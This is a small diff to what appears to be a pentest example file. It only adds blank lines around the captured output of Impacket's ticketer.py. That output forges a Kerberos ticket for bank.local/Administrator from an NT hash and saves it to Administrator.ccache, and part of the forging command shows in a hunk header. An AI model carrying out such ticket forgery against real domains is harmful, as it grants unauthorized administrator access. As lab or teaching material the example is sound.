@@ -9,6 +9,7 @@ output: 'root@kali:~# ticketer.py -nthash 7257228d1626640fb895708eb809c20e -doma
 
   Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation
 
+
   [*] Creating basic skeleton ticket and PAC Infos
 
   [*] Customizing ticket for bank.local/Administrator
@@ -61,3 +62,5 @@ Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corpo
 [*]     EncASRepPart
 [*] Saving ticket in Administrator.ccache
 ```
+
+
